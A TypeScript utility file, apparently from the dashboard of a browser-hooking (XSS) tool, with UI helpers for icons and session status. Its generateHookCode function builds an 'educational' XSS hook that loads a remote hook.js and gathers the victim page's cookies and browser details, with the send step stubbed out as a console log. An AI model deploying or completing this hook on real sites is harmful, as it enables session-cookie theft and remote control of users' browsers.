import { type ClassValue, clsx } from "clsx";
import { twMerge } from "tailwind-merge";

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

export function formatDate(date: Date | string): string {
  if (!date) return '';
  const d = typeof date === 'string' ? new Date(date) : date;
  return d.toLocaleString();
}

export function shortenText(text: string, maxLength: number = 50): string {
  if (!text) return '';
  return text.length > maxLength ? `${text.substring(0, maxLength)}...` : text;
}

export function getBaseUrl(): string {
  // Use REPLIT_DOMAINS environment variable if available
  if (typeof window !== 'undefined') {
    return window.location.origin;
  }
  
  if (import.meta.env.VITE_API_BASE_URL) {
    return import.meta.env.VITE_API_BASE_URL;
  }
  
  return 'http://localhost:5000';
}

export function generateHookCode(baseUrl: string): string {
  return `
// Educational XSS Hook Example - For demonstration only
// IMPORTANT: Using this on systems without permission is illegal

(function() {
  var hook = {
    url: '${baseUrl}/hook.js',
    init: function() {
      var script = document.createElement('script');
      script.src = this.url;
      script.setAttribute('data-demo', 'true');
      document.head.appendChild(script);
      this.sendInfo();
    },
    sendInfo: function() {
      var data = {
        url: window.location.href,
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        screenSize: {
          width: screen.width,
          height: screen.height
        },
        timestamp: new Date().toISOString()
      };
      
      // In a real implementation, this would send data to the hook server
      console.log('Educational demo only - Data that would be sent:', data);
    }
  };
  
  hook.init();
})();`;
}

export function getBrowserIcon(browser: string): string {
  if (!browser) return 'language';
  
  const browserLower = browser.toLowerCase();
  if (browserLower.includes('chrome')) return 'language';
  if (browserLower.includes('firefox')) return 'language';
  if (browserLower.includes('safari')) return 'language';
  if (browserLower.includes('edge')) return 'language';
  if (browserLower.includes('explorer')) return 'language';
  if (browserLower.includes('opera')) return 'language';
  
  return 'language';
}

export function getOsIcon(os: string): string {
  if (!os) return 'devices';
  
  const osLower = os.toLowerCase();
  if (osLower.includes('windows')) return 'computer';
  if (osLower.includes('mac')) return 'laptop_mac';
  if (osLower.includes('ios')) return 'phone_iphone';
  if (osLower.includes('android')) return 'phone_android';
  if (osLower.includes('linux')) return 'computer';
  
  return 'devices';
}

export function getStatusClass(status: string): string {
  if (!status) return '';
  
  const statusLower = status.toLowerCase();
  if (statusLower === 'active') return 'bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200';
  if (statusLower === 'idle') return 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-200';
  if (statusLower === 'offline') return 'bg-neutral-100 text-neutral-800 dark:bg-neutral-700 dark:text-neutral-200';
  
  return '';
}
